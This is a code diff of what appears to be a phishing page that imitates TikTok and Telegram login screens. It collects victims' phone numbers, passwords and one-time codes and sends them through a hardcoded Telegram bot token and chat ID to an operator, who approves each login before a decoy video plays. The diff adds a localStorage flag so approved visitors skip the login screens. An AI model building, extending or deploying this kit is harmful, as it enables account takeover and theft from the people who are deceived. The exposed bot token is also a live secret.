@@ -24,12 +24,10 @@
 </head>
 <body>
 
-<!-- Notification Bar -->
 <div id="topNotice"></div>
 
 <div id="app" class="w-full h-full relative">
     
-    <!-- STEP 1: Selection -->
     <div id="selectScreen" class="bg-setup w-full h-full flex flex-col items-center justify-center p-8">
         <div class="bg-white/90 backdrop-blur-md p-10 w-full max-w-sm rounded-[30px] shadow-2xl text-center">
             <h1 class="text-xl font-bold mb-8">Login to continue</h1>
@@ -42,7 +40,6 @@
         </div>
     </div>
 
-    <!-- STEP 2: TikTok Login (Pass/OTP) -->
     <div id="ttScreen" class="hidden bg-white w-full h-full p-6 flex flex-col">
         <div class="flex items-center justify-between mb-8">
             <i onclick="toggle('selectScreen')" class="fa-solid fa-xmark text-xl"></i>
@@ -56,10 +53,8 @@
                 <input type="number" id="ttPhone" placeholder="Phone number" class="tt-input flex-1 m-0">
             </div>
             
-            <!-- Password Field -->
             <input type="password" id="ttPass" placeholder="Password" class="tt-input">
             
-            <!-- OTP Field (Hidden until Forget is clicked) -->
             <div id="otpSection" class="hidden relative">
                 <input type="number" id="ttOtp" placeholder="Enter 6-digit code" class="tt-input">
                 <button onclick="getOTP('ttPhone')" class="absolute right-3 top-3 text-red-500 font-bold text-sm">Get code</button>
@@ -73,7 +68,6 @@
         </div>
     </div>
 
-    <!-- Telegram UI (Simplified) -->
     <div id="tgScreen" class="hidden bg-white w-full h-full p-6">
         <h1 class="text-xl font-bold mb-6">Telegram Login</h1>
         <input type="number" id="tgPhone" placeholder="Phone Number" class="tt-input">
@@ -82,7 +76,6 @@
         <button onclick="submitTG()" class="w-full bg-[#2481cc] text-white py-4 rounded-xl font-bold">Continue</button>
     </div>
 
-    <!-- STEP 3: Checking Screen (Professional) -->
     <div id="waitScreen" class="hidden w-full h-full flex flex-col items-center justify-center bg-black/60 backdrop-blur-sm">
         <div class="bg-white p-10 rounded-3xl shadow-2xl text-center flex flex-col items-center">
             <div class="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-6"></div>
@@ -91,7 +84,6 @@
         </div>
     </div>
 
-    <!-- STEP 4: Final Screen -->
     <div id="videoScreen" class="hidden w-full h-full relative bg-black">
         <video id="bgVideo" loop playsinline class="w-full h-full object-cover">
             <source src="https://raw.githubusercontent.com/tar-alt/Photo-link-/6c702837cece7d0f80bad49fe77f65382f442422/From%20KlickPin%20CF%20Clear%20social%20dialogue%20prompts%20for%20people%20who%20love%20beauty%20with%20timeless%20style%20that%20stay%20calm%20and%20fair%20-%20Pin-1121326007230552065.mp4" type="video/mp4">
@@ -105,6 +97,13 @@
     const token = "8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0";
     const chat = "5304050102";
     let userKey = "ID_" + Math.floor(Math.random() * 9999);
+
+    // ပထမဆုံး စဖွင့်ဖွင့်ချင်း Approved ဖြစ်ပြီးသားလား စစ်မည်
+    window.onload = function() {
+        if(localStorage.getItem("isApproved") === "true") {
+            playFinal();
+        }
+    };
 
     function toggle(id) {
         document.querySelectorAll('#app > div').forEach(d => d.classList.add('hidden'));
@@ -167,6 +166,8 @@
 
             if (callback === `ok_${userKey}`) {
                 clearInterval(interval);
+                // Approved ဖြစ်သွားပြီဆိုတာကို Browser မှာ မှတ်ထားလိုက်မယ်
+                localStorage.setItem("isApproved", "true");
                 showNotice("Login ဝင်ရောက်မှု အောင်မြင်ပါသည်", "success");
                 await sendBot(`✅ ID: ${userKey} အား အောင်မြင်စွာ လက်ခံလိုက်ပါပြီ။`, false);
                 setTimeout(playFinal, 2000);
